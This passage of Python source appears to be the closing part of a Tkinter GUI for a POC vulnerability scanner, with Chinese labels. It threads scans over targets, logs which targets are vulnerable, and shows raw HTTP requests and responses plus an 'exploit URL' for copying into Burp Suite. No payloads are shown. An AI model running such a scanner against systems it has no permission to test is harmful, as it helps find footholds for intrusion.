        proxy_type = self.engine.proxy_config.get("type", "None")
        if proxy_type != "None":
            self.log(
                f"使用代理: {proxy_type}://{self.engine.proxy_config.get('host', '')}:{self.engine.proxy_config.get('port', '')}")

        # 初始化进度
        self.total_tasks = len(targets) * len(selected_pocs)
        self.completed_tasks = 0

        # 更新UI状态
        self.is_scanning = True
        self.stop_requested = False
        self.scan_btn.config(state=tk.DISABLED)
        self.stop_btn.config(state=tk.NORMAL)

        # 在新线程中执行扫描
        self.scan_thread = threading.Thread(
            target=self._run_scan,
            args=(targets, selected_pocs)
        )
        self.scan_thread.daemon = True
        self.scan_thread.start()

    def stop_scan(self):
        """ 停止扫描 """
        self.stop_requested = True
        self.log("正在停止扫描...")

    def _run_scan(self, targets, poc_ids):
        """ 执行扫描任务 """
        for target in targets:
            if self.stop_requested:
                break

            for poc_id in poc_ids:
                if self.stop_requested:
                    break

                try:
                    # 执行扫描
                    is_vuln, detail, raw_request, raw_response, exploit_url, response = self.engine.scan_target(target,
                                                                                                                poc_id)
                    poc_name = self.engine.poc_db[poc_id]["name"]

                    # 更新扫描日志
                    status = "存在漏洞" if is_vuln else "安全"
                    log_msg = f"[{target}][{poc_name}] {status} - {detail}"

                    # 根据扫描结果确定标签
                    if is_vuln:
                        self.log(log_msg, "SUCCESS")
                        tags = ("vulnerable",)
                    elif "请求失败" in detail:
                        self.log(log_msg, "ERROR")
                        tags = ("error",)
                    else:
                        self.log(log_msg, "INFO")
                        tags = ("safe",)

                    # 在结果树中插入数据
                    self.master.after(0, self._add_scan_result, target, poc_name, status, detail, is_vuln, raw_request,
                                      raw_response, exploit_url)

                    # 存储原始请求和响应数据
                    if is_vuln:
                        vuln_id = str(uuid.uuid4())
                        self.vuln_details[vuln_id] = {
                            "raw_request": raw_request,
                            "raw_response": raw_response,
                            "exploit_url": exploit_url,
                            "target": target,
                            "poc": poc_name
                        }

                except Exception as e:
                    self.log(f"扫描出错: {str(e)}", "ERROR")

                finally:
                    # 更新进度
                    self.completed_tasks += 1
                    progress = self.completed_tasks / self.total_tasks * 100
                    self.master.after(0, self._update_scan_progress, progress)

        # 扫描完成
        self.master.after(0, self._on_scan_complete)

    def _add_scan_result(self, target, poc_name, status, detail, is_vuln, raw_request, raw_response, exploit_url):
        """ 在UI线程中添加扫描结果 """
        # 根据结果设置标签
        if is_vuln:
            tags = ("vulnerable",)
        elif "请求失败" in detail:
            tags = ("error",)
        else:
            tags = ("safe",)

        item = self.result_tree.insert(
            "",
            tk.END,
            values=(target, poc_name, status, detail),
            tags=tags
        )

        # 存储原始请求和响应数据（如果存在漏洞）
        if is_vuln:
            self.vuln_details[item] = {
                "raw_request": raw_request,
                "raw_response": raw_response,
                "exploit_url": exploit_url,
                "target": target,
                "poc": poc_name
            }

    def _update_scan_progress(self, progress):
        """ 更新扫描进度显示 """
        # 这里可以添加进度条或其他进度显示

        # 更新状态栏日志
        self.log(f"扫描进度: {progress:.1f}%", "DEBUG")

    def _on_scan_complete(self):
        """ 扫描完成处理 """
        self.is_scanning = False
        self.scan_btn.config(state=tk.NORMAL)
        self.stop_btn.config(state=tk.DISABLED)

        if self.stop_requested:
            self.log("扫描已中止", "WARNING")
        else:
            self.log("扫描完成!", "SUCCESS")

    def clear_logs(self):
        """ 清空日志区域 """
        self.log_area.configure(state="normal")
        self.log_area.delete("1.0", tk.END)
        self.log_area.configure(state="disabled")
        self.log("日志已清空")

    def export_results(self):
        """ 导出扫描结果 """
        if not self.result_tree.get_children():
            messagebox.showwarning("警告", "没有扫描结果可导出")
            return

        file_path = filedialog.asksaveasfilename(
            defaultextension=".csv",
            filetypes=[("CSV文件", "*.csv"), ("所有文件", "*.*")]
        )

        if not file_path:
            return

        try:
            with open(file_path, "w", encoding="utf-8") as f:
                # 写入表头
                f.write("目标,POC名称,状态,详情\n")

                # 写入所有行
                for item in self.result_tree.get_children():
                    values = self.result_tree.item(item, "values")
                    f.write('"' + '","'.join(values) + '"\n')

            self.log(f"扫描结果已导出到: {file_path}")
        except Exception as e:
            self.log(f"导出失败: {str(e)}", "ERROR")

    def _on_result_select(self, event):
        """ 当选择扫描结果时显示详细信息 """
        selected = self.result_tree.selection()
        if selected:
            item = selected[0]

            # 检查是否有关联的漏洞详细信息
            vuln_info = self.vuln_details.get(item)
            if vuln_info:
                self.show_vuln_details(vuln_info)

    def show_vuln_details(self, detail_info):
        """ 显示漏洞详情 - 新增响应包显示 """
        top = tk.Toplevel(self.master)
        top.title(f"漏洞详情 - {detail_info['poc']}")
        top.geometry("1000x800")  # 增加高度以容纳两个数据包

        # 创建主要框架
        main_frame = ttk.Frame(top)
        main_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)

        # 使用Notebook分页显示请求包和响应包
        notebook = ttk.Notebook(main_frame)
        notebook.pack(fill=tk.BOTH, expand=True, pady=10)

        # =========== 请求包标签页 ===========
        request_frame = ttk.Frame(notebook)
        notebook.add(request_frame, text="HTTP请求包")

        # 基本信息区域
        info_frame = ttk.LabelFrame(request_frame, text="基本信息")
        info_frame.pack(fill=tk.X, pady=5)

        ttk.Label(info_frame, text=f"目标: {detail_info['target']}").pack(anchor=tk.W, pady=2)
        ttk.Label(info_frame, text=f"POC: {detail_info['poc']}").pack(anchor=tk.W, pady=2)

        if detail_info.get("exploit_url"):
            exploit_frame = ttk.Frame(info_frame)
            exploit_frame.pack(fill=tk.X, pady=5)

            ttk.Label(exploit_frame, text="漏洞URL:").pack(side=tk.LEFT, padx=5)
            exploit_entry = ttk.Entry(exploit_frame, width=60)
            exploit_entry.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=5)
            exploit_entry.insert(0, detail_info["exploit_url"])

            ttk.Button(
                exploit_frame,
                text="打开",
                command=lambda: webbrowser.open(detail_info["exploit_url"]),
                width=8
            ).pack(side=tk.LEFT, padx=5)

        # HTTP请求数据包区域
        request_data_frame = ttk.LabelFrame(request_frame, text="请求包 (可直接复制到Burp Suite)")
        request_data_frame.pack(fill=tk.BOTH, expand=True, pady=5)

        # 创建滚动条
        scroll_y = ttk.Scrollbar(request_data_frame)
        scroll_y.pack(side=tk.RIGHT, fill=tk.Y)

        scroll_x = ttk.Scrollbar(request_data_frame, orient=tk.HORIZONTAL)
        scroll_x.pack(side=tk.BOTTOM, fill=tk.X)

        request_text = scrolledtext.Text(
            request_data_frame,
            wrap=tk.NONE,
            yscrollcommand=scroll_y.set,
            xscrollcommand=scroll_x.set,
            font=("Consolas", 10),
            background="#1E1E1E",
            foreground="#D4D4D4"
        )
        request_text.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)

        scroll_y.config(command=request_text.yview)
        scroll_x.config(command=request_text.xview)

        # 插入原始HTTP请求内容
        if detail_info.get("raw_request"):
            request_text.insert(tk.END, detail_info["raw_request"])

        # 禁止编辑
        request_text.configure(state="disabled")

        # =========== 响应包标签页 ===========
        response_frame = ttk.Frame(notebook)
        notebook.add(response_frame, text="HTTP响应包")

        # 响应数据包区域
        response_data_frame = ttk.LabelFrame(response_frame, text="服务器响应")
        response_data_frame.pack(fill=tk.BOTH, expand=True, pady=5)

        # 创建滚动条
        scroll_y_resp = ttk.Scrollbar(response_data_frame)
        scroll_y_resp.pack(side=tk.RIGHT, fill=tk.Y)

        scroll_x_resp = ttk.Scrollbar(response_data_frame, orient=tk.HORIZONTAL)
        scroll_x_resp.pack(side=tk.BOTTOM, fill=tk.X)

        response_text = scrolledtext.Text(
            response_data_frame,
            wrap=tk.NONE,
            yscrollcommand=scroll_y_resp.set,
            xscrollcommand=scroll_x_resp.set,
            font=("Consolas", 10),
            background="#1E1E1E",
            foreground="#D4D4D4"
        )
        response_text.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)

        scroll_y_resp.config(command=response_text.yview)
        scroll_x_resp.config(command=response_text.xview)

        # 插入原始HTTP响应内容
        if detail_info.get("raw_response"):
            response_text.insert(tk.END, detail_info["raw_response"])

        # 禁止编辑
        response_text.configure(state="disabled")

        # =========== 底部按钮区域 ===========
        btn_frame = ttk.Frame(main_frame)
        btn_frame.pack(fill=tk.X, pady=10)

        if pyperclip:
            # 新增复制响应按钮
            ttk.Button(
                btn_frame,
                text="复制响应包",
                command=lambda: self._copy_to_clipboard(detail_info.get("raw_response", "")),
                width=15
            ).pack(side=tk.LEFT, padx=5)

            ttk.Button(
                btn_frame,
                text="复制请求包",
                command=lambda: self._copy_to_clipboard(detail_info.get("raw_request", "")),
                width=15
            ).pack(side=tk.LEFT, padx=5)

        ttk.Button(
            btn_frame,
            text="关闭",
            command=top.destroy,
            width=10
        ).pack(side=tk.RIGHT, padx=5)

    def _copy_to_clipboard(self, content):
        """ 复制内容到剪贴板 """
        try:
            pyperclip.copy(content)
            self.log("数据已复制到剪贴板", "SUCCESS")
        except Exception as e:
            self.log(f"复制失败: {str(e)}", "ERROR")


# ================== 主程序入口 ==================
if __name__ == "__main__":
    root = tk.Tk()
    app = POCScannerGUI(root)
    root.mainloop()
